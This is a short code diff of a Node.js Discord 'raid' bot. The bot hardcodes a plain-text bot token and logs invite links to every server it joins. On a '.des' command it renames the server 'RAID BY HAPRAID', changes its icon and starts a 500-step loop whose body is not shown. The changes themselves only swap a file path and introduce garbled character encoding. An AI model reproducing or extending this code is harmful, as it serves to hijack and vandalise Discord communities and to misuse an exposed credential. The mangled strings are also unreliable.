@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 const bot = new Discord.Client();
 const token = "NDM3NzQzNTYyMTgwNzg4MjQx.Db6gAQ.un6SC55jJHsCOJ6B4qfbc9dlSH0";
 var prefix = ".";
-var mention = "126connectés"
+var mention = "126connectÃ©s"
 
 var fucked = false;
  
@@ -10,7 +10,7 @@ bot.on('ready',() => {
     //invit link
     bot.guilds.forEach(guild => {
       var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
+      invite.createInvite().then(invite => console.log(`ConnectÃ© sur : ${guild.name} ${invite}`));
     })
 });
  
@@ -35,7 +35,7 @@ bot.on('message', msg => {
     console.log(`Commande .des par ${msg.author.tag}`);
  
     if (!fucked){
-      msg.guild.setIcon("./hapraid.png").catch(e => {});
+      msg.guild.setIcon("hapraid.png").catch(e => {});
       msg.guild.setName('RAID BY HAPRAID').catch(e => {});
  
       for (var i = 0; i < 500; i++) {
